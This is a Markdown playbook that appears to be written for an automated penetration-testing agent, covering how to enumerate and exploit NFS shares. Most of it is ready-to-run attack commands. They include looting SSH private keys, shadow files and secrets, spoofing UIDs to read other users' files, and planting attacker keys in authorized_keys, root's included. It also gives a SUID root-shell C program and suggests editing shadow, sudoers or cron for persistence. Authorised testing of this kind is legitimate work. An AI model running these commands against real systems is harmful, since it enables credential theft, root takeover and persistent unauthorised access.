---
name: nfs-enum
description: Enumerate and loot NFS found by recon (tcp,udp/111 rpcbind, 2049 nfs, mountd) — rpcinfo/showmount export discovery, export-ACL reading, mounting v3/v4, UID-spoofing and no_root_squash exploitation, nmap nfs-* NSE, with rupu-ingestible work units and findings.
license: Proprietary
compatibility: Linux attack host with nfs-common (showmount, rpcinfo, mount.nfs), nmap; python3 for the parser; local root for uid attacks
metadata:
  author: Section9Labs
  stage: service-enumeration
  trigger-ports: "111/tcp, 111/udp, 2049/tcp, 2049/udp, mountd"
---

# NFS Enumeration

Entry condition: recon reports 111 (rpcbind/portmapper) and/or 2049 (nfs) open. mountd often
sits on a high dynamic port registered with the portmapper. NFSv4 needs only 2049/tcp — if
111 is filtered but 2049 is open, go straight to a v4 mount (§3).

Imports (shared reporting pack — use these, do not re-implement):
- `work-units` — consume/emit the work-unit JSON array
- `coverage-assets` — `assets.mark` hosts/exports as covered
- `finding-report` — `findings.report` for verified issues

## 1. RPC and export discovery

```
rpcinfo -p 192.0.2.20                 # portmapper dump: program ver proto port service
rpcinfo -T tcp 192.0.2.20 nfs         # probe a specific program over tcp
showmount -e 192.0.2.20               # export list + allowed-client ACL  <-- key output
showmount -a 192.0.2.20               # client:/mount pairs currently mounted (other victims!)
showmount -d 192.0.2.20               # directories actually in use
```

Read `rpcinfo -p`: lines for `nfs` (100003) tell you supported versions (2/3/4); `mountd`
(100005) gives the mount protocol port; `nlockmgr`, `status`, `rquotad` confirm a full NFSv3
stack. No `mountd` but nfs v4 present → v4-only server, `showmount` may return nothing; mount
`/` and browse the pseudo-fs instead.

nmap NSE (works even when `showmount` is firewalled, and lists perms without mounting):

```
nmap -sV -p111,2049 --script nfs-showmount,nfs-ls,nfs-statfs 192.0.2.20
nmap -sU -sS -p111 --script rpcinfo 192.0.2.0/24    # sweep a subnet for rpc services
```

- `nfs-showmount` = exports+ACLs; `nfs-ls` = listing with uid/gid/mode per file;
  `nfs-statfs` = disk usage. `--script-args nfs.version=3,mount.version=3` to force versions.

## 2. Reading export ACLs

`showmount -e` output:

```
Export list for 192.0.2.20:
/srv/backups   *
/home          192.0.2.0/24,198.51.100.0/24
/opt/app       client1.example.com
```

- `*` or `(everyone)` → **world-mountable**. Your subnet listed → mountable from where you sit.
  Hostname-only ACLs → check if the server resolves clients via DNS you can influence, or
  source from a compromised host inside the ACL.
- The server-side options (`/etc/exports`) are NOT shown by showmount. Infer/verify by
  behavior, or read `/etc/exports` once mounted. Options that matter
  (full table + exploitation notes in `references/export-options.md`):
  - `rw` vs `ro` — write access.
  - `root_squash` (default) — your uid 0 is mapped to nobody. **`no_root_squash`** — your
    uid 0 is honored: write root-owned files, read everything → critical.
  - `all_squash` — every uid mapped to anon; `anonuid`/`anongid` set the mapping.
  - `insecure` — accepts client source ports >1024, so an **unprivileged** local user on any
    allowed client can speak NFS directly (libnfs tools) and spoof any uid without root.
  - `sec=sys` (default) — the client *asserts* uid/gid, nothing verifies it. `sec=krb5*` kills
    uid spoofing; if you see krb5, pivot to Kerberos credential attacks instead.

## 3. Mounting and looting

```
mkdir -p /mnt/nfs
sudo mount -t nfs -o vers=3,nolock 192.0.2.20:/srv/backups /mnt/nfs
sudo mount -t nfs -o vers=4 192.0.2.20:/ /mnt/nfs4          # v4: mount pseudo-root, browse
sudo mount -t nfs -o vers=3,nolock,port=2049,mountport=892 192.0.2.20:/home /mnt/nfs  # firewalled portmapper
```

`nolock` avoids hanging on nlockmgr; add `soft,timeo=30,retrans=2` so a dead server doesn't
wedge the box; `ro` if you only need to read. Then loot:

```
ls -laR /mnt/nfs | head -200
find /mnt/nfs -maxdepth 4 \( -name 'id_rsa*' -o -name '*.key' -o -name '*.pem' \
  -o -name 'authorized_keys' -o -name '*.kdbx' -o -name 'shadow' -o -name '*.conf' \
  -o -name '*.sql' -o -name '*.tar*' -o -name 'web.config' -o -name '.env' \) -ls 2>/dev/null
find /mnt/nfs -maxdepth 4 -name '.bash_history' -exec grep -l 'pass\|ssh\|mysql' {} \;
```

Note uid/gid and modes in `ls -ln` output — files you can't read yet are the input to §4.
`df -h /mnt/nfs` and `nfs-statfs` tell you if it's worth exfiltrating wholesale.

## 4. UID attacks

NFSv3 with `sec=sys` trusts the uid/gid the client sends. You control the client.

**A. Read restricted files (works even WITH root_squash).** A file is `-rw------- 1004 1004`?
Create a matching local identity and read it:

```
sudo useradd -u 1004 shadowuser
sudo -u shadowuser cat /mnt/nfs/home/dev/.ssh/id_rsa
# or without useradd: python3 -c 'import os;os.setgid(1004);os.setuid(1004);print(open("/mnt/nfs/home/dev/.ssh/id_rsa").read())'  # as root
```

Iterate: collect every distinct owner uid under the mount, impersonate each, re-sweep for loot.

**B. Write as any user (rw export).** Same trick with setuid to the directory-owner uid lets
you drop `~/.ssh/authorized_keys` into a user's exported home → SSH in as that user:

```
sudo -u shadowuser mkdir -p /mnt/nfs/home/dev/.ssh
sudo -u shadowuser sh -c 'cat ~/attacker_key.pub > /mnt/nfs/home/dev/.ssh/authorized_keys'
sudo -u shadowuser chmod 700 /mnt/nfs/home/dev/.ssh; ssh -i attacker_key dev@192.0.2.20
```

**C. `no_root_squash` + rw → root on the server.** Your uid 0 writes root-owned files:

```
# 1) SUID shell dropped into the export, executed by any local user on the server:
cat > /tmp/pwn.c <<'EOF'
#include <unistd.h>
int main(void){ setuid(0); setgid(0); execl("/bin/sh","sh","-p",(char*)0); return 1; }
EOF
gcc -static -o /mnt/nfs/pwn /tmp/pwn.c       # static: avoid libc mismatch with the server
sudo chown root:root /mnt/nfs/pwn && sudo chmod 4755 /mnt/nfs/pwn
# then from ANY shell on the server (even low-priv): /srv/backups/pwn  -> root shell
# (needs the export mounted on the server without 'nosuid'; a copied bash works too:
#  cp /bin/bash /mnt/nfs/.b; sudo chown root:root /mnt/nfs/.b; sudo chmod 4755 /mnt/nfs/.b; run `.b -p`)

# 2) If /home or /root is exported: write root's authorized_keys directly
sudo mkdir -p /mnt/nfs/root/.ssh
sudo sh -c 'cat ~/attacker_key.pub > /mnt/nfs/root/.ssh/authorized_keys'
ssh -i attacker_key root@192.0.2.20

# 3) If /etc is exported: append to shadow/passwd/sudoers or drop a cron in /etc/cron.d
```

Hand off the obtained shell/creds to the exploitation flow.

**D. No local root / `insecure` export.** With the `insecure` option the server accepts
high source ports, so uid spoofing needs no root at all — use libnfs userspace tools
(`nfs-ls nfs://192.0.2.20/srv/backups?version=3&uid=0`, `nfs-cp`) or
[nfsshell/NfSpy-style clients] to assert arbitrary uids from an unprivileged shell.

## 5. Parse, hand off, report

```
rpcinfo -p 192.0.2.20   > rpcinfo_192.0.2.20.txt
showmount -e 192.0.2.20 > exports_192.0.2.20.txt
python3 scripts/parse_nfs.py --out-dir nfs_out \
  --rpcinfo 192.0.2.20=rpcinfo_192.0.2.20.txt \
  --showmount 192.0.2.20=exports_192.0.2.20.txt \
  --exports-file 192.0.2.20=looted_etc_exports.txt      # optional: looted /etc/exports -> real options
```

Outputs in `nfs_out/`:
- `nfs_enum.json` — per-host `{host, exports:[{path,allowed,options}], nfs_versions}` with
  `world_readable` / `no_root_squash` flags
- `work_units.json` — clean JSON array `[{id,title,targets,hints}]` (mount-and-loot units,
  no_root_squash-exploit units, uid-impersonation units)

Handoff per `references/rupu.md`:
- feed `work_units.json` to a rupu `for_each:` (via `read_file`) or a lead's `dispatch`;
- `assets.mark` each host:111/2049 service and each export path as coverage;
- `findings.report`: world-mountable export (medium+), sensitive data in export (per content),
  **rw + no_root_squash** (critical, include the §4C proof), uid-spoof read of restricted data.

Downstream: SSH keys/creds → lateral movement; `showmount -a` client list → new targets for
host-discovery; writable homes → persistence; root shell → post-exploitation flow.
